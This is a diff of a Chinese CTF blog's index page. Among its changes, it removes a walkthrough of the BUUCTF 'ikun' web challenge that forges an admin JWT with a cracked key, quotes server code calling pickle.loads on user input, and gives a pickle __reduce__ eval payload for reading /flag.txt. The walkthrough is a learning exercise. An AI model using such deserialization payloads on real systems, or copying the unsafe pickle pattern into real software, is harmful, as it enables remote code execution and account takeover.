@@ -124,7 +124,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -164,6 +164,92 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/29/buuctf-72-CSCCTF-2019-Qual-FlaskLight/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
+      <meta itemprop="name" content="Z1d10t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Z1d10t's Blog">
+      <meta itemprop="description" content="welcome to my blog (*^_^*)">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Z1d10t's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2023/04/29/buuctf-72-CSCCTF-2019-Qual-FlaskLight/" class="post-title-link" itemprop="url">buuctf-72-[CSCCTF 2019 Qual]FlaskLight</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-04-29 13:44:05 / 修改时间：13:45:50" itemprop="dateCreated datePublished" datetime="2023-04-29T13:44:05+08:00">2023-04-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/buuctf/" itemprop="url" rel="index"><span itemprop="name">buuctf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>[CSCCTF 2019 Qual]FlaskLight</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/04/29/buuctf-72-CSCCTF-2019-Qual-FlaskLight/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/29/buuctf-71-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -194,7 +280,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-04-29 13:38:33 / 修改时间：13:39:46" itemprop="dateCreated datePublished" datetime="2023-04-29T13:38:33+08:00">2023-04-29</time>
+      <time title="创建时间：2023-04-29 13:38:33 / 修改时间：13:41:45" itemprop="dateCreated datePublished" datetime="2023-04-29T13:38:33+08:00">2023-04-29</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -216,62 +302,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <span id="more"></span>
-
-<h2 id="碎碎念："><a href="#碎碎念：" class="headerlink" title="碎碎念："></a>碎碎念：</h2><p>一道关于jwt和python反序列化的题目，对我来说很新颖，暂时只会php的反序列化，就当作学习题目了，然后越做到后面的题目发现会python脚本干一些机械重复性的事情真的很有用，得找时间去学着写脚本。</p>
-<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>进入题目</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679473847087-0169d116-8a33-4976-bd55-f371017157d8.png" alt="img"></p>
-<p>看过源码一些正常操作之后什么也没发现，看到一句话，应该是让我们买lv6，在这之前先去注册登录，然后日常看一下admin的用户，发现是已经注册过的。</p>
-<p>一开始我都是一页一页的在找，发现找了10几页都没有找到，就感觉不对劲了，然后看了大佬的wp，发现要用脚本去找，最后page=181，我真的人都傻了</p>
-<p>这里放下大佬的脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">for i in range(1,200):</span><br><span class="line"></span><br><span class="line">    time.sleep(0.8)</span><br><span class="line"></span><br><span class="line">    print(i)</span><br><span class="line"></span><br><span class="line">    url = &#x27;http://ca5b02fb-d09b-45b9-b0ff-a14785826592.node3.buuoj.cn/shop?page=&#123;&#125;&#x27;.format(i)</span><br><span class="line"></span><br><span class="line">    r = requests.get(url)</span><br><span class="line"></span><br><span class="line">    if &#x27;lv6.png&#x27; in r.text:</span><br><span class="line"></span><br><span class="line">        print(&quot;找到lv6-----&#123;&#125;&quot;.format(i))</span><br><span class="line"></span><br><span class="line">        break</span><br></pre></td></tr></table></figure>
-
-<p>其实这个脚本还是蛮容易理解的，将页数格式化，让后一直循环，当该页面存在<code>lv6.png</code>内容时，就说明找到了</p>
-<p>但是这里要注意，一定让脚本暂停0.8秒，因为buu会防爬</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474702762-160ddbe0-fb42-4be9-8366-724c99159d5b.png" alt="img"></p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474338539-15f8f312-2c1b-4634-a335-e851b7b615de.png" alt="img"></p>
-<p>找到之后发现这个钱数我们买不了，抓包查看，发现有折扣</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474379880-aa279a5f-7795-4149-898f-7a5b6e3e7554.png" alt="img"></p>
-<p>直接修改一下，发现页面跳转了</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474405099-6658c1fd-c0b6-4f9a-82df-b7676aa6ea26.png" alt="img"></p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474429619-3a0c3aa1-a290-4dc3-a611-ae624ea29688.png" alt="img"></p>
-<p>只容许admin访问，这也应印证了之前注册的时候admin已经被注册过</p>
-<p>抓包分析一下，这里就是关于jwt的知识点了，参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">https://www.cnblogs.com/cjsblog/p/9277677.html</a></p>
-<p>就我个人认为，类似于我们平常做题的php session用于记录当前登录用户会话信息</p>
-<p>那么弄明白之后就试着去伪造这个jwt，把我们的jwt伪造成admin的那么不就可以成功嘛</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474509525-bb77812e-6b29-47af-9b35-e4030eef9816.png" alt="img"></p>
-<p>先将这个jwt字符串给 弄回原来的模样 这里有个工具：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679474884435-1df5d5ae-3d04-4797-973c-28d07ddacbbf.png" alt="img"></p>
-<p>发现存在我们登录名称，直接改为admin，再抓包可以嘛，理论可以，但是这里还存在一个key，必须拿到这个key才能再反编译回去符合他的要求，这里就有个暴力破解jwt key的脚本 <a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
-<p>我直接是放在kali环境下了，因为还要配置docker环境，环境配置好以后，里面有个文件说明，看看就会使用。</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475165344-5aead3f4-8bbd-47b7-97e8-5e6c22972de8.png" alt="img"></p>
-<p>注意要用root身份 爆出 key为 <code>1Kun</code> </p>
-<p>现在将用户换为 <code>admin</code> key使用 <code>1Kun</code></p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475274835-d6c1dca3-27df-4561-89ed-a8aec4f676ad.png" alt="img"></p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475309325-035236f5-1a7f-49c8-a173-ad59fad9498c.png" alt="img"></p>
-<p>然后查看源码 发现一个压缩包</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475357662-942c80ce-c9b9-4d58-9db6-4f749ac6cfd4.png" alt="img"></p>
-<p>下载下来 </p>
-<p>看了大佬的wp 发现Admin.py存在反序列化漏洞</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475402464-72d76905-3a4f-4dee-ba61-e28208f05db6.png" alt="img"></p>
-<p>源码附上：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import tornado.web</span><br><span class="line">from sshop.base import BaseHandler</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        if self.current_user == &quot;admin&quot;:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line">        else:</span><br><span class="line">            return self.render(&#x27;no_ass.html&#x27;)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(&#x27;become&#x27;)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br></pre></td></tr></table></figure>
-
-<p>这里的pickle模块应该就是属于python 的序列化与反序列化模块</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475553228-e58261a6-ee61-458f-ab34-317dd22fdd73.png" alt="img"></p>
-<p>看到become存在反序列化 那么我们就可以像php反序列化漏洞一样 构造读flag的序列化字符串 然后传给become就可以获得flag了</p>
-<p>本地构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):  ##当pickle对象被调用时自动执行</span><br><span class="line">       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,)) ##注意要是元组</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())  ##如果对pickle不理解可自行百度</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
-
-<p>这里我在本机vscode会报错</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475702429-4efd6e74-e03d-49da-91a6-b059d717becd.png" alt="img"></p>
-<p>发现这个脚本是属于python2的 我这是python3 所以我只好去我的kali虚拟去跑</p>
-<p>注意这里要把中文注释删了 不然会报错 </p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475831556-3f608263-1166-4f39-a71b-dcece769b79d.png" alt="img"></p>
-<p>然后点击 一键成为大会员 抓包 修改become值</p>
-<p>成功拿到 flag</p>
-<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679475923738-eada5091-7c68-4503-9402-50b706cc41c3.png" alt="img"></p>
-
+          <p>[CISCN2019 华北赛区 Day1 Web2]ikun</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/04/29/buuctf-71-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -327,7 +366,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2023-04-29 13:30:08 / 修改时间：13:33:00" itemprop="dateCreated datePublished" datetime="2023-04-29T13:30:08+08:00">2023-04-29</time>
+      <time title="创建时间：2023-04-29 13:30:08 / 修改时间：13:41:34" itemprop="dateCreated datePublished" datetime="2023-04-29T13:30:08+08:00">2023-04-29</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -967,92 +1006,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/04/05/CTF-SHOW-2023%E6%84%9A%E4%BA%BA%E6%9D%AF-WEB%E9%83%A8%E5%88%86WP/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84docker%E5%BC%80%E8%AE%BEweb%E9%9D%B6%E5%9C%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/avatar.png">
-      <meta itemprop="name" content="Z1d10t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Z1d10t's Blog">
-      <meta itemprop="description" content="welcome to my blog (*^_^*)">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | Z1d10t's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/03/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84docker%E5%BC%80%E8%AE%BEweb%E9%9D%B6%E5%9C%BA/" class="post-title-link" itemprop="url">记一次简单的docker开设web靶场</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2023-03-31 15:13:38 / 修改时间：15:24:51" itemprop="dateCreated datePublished" datetime="2023-03-31T15:13:38+08:00">2023-03-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">搭建</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>记录一次简单的docker开设web靶场</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/03/31/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84docker%E5%BC%80%E8%AE%BEweb%E9%9D%B6%E5%9C%BA/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
